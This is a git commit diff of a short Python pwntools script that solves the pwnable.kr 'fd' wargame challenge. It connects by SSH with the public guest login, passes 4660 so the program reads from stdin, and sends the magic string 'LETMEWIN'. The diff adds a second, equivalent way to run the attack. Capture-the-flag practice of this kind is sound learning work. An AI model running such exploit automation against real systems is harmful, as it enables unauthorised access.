22f662d7595206ed4a1eb9d5800e0e715804777a
v13td0x <0xdt314@gmail.com>
2021-04-28 22:42:02 +0700

    2

--- fd.py
+++ fd.py
@@ -1,7 +1,12 @@
 from pwn import *
 
 r = ssh(user = 'fd', host='pwnable.kr', port=2222, password='guest')
+
+#___________________________________________1__________________________
 process = r.process(executable='./fd', argv=['fd','4660'])
 process.sendline('LETMEWIN')
 print(process.recvlines(2))
-
+#___________________________________________2__________________________
+p = r.process(['./fd', '4660'])
+p.sendline('LETMEWIN')
+print(p.recvall())
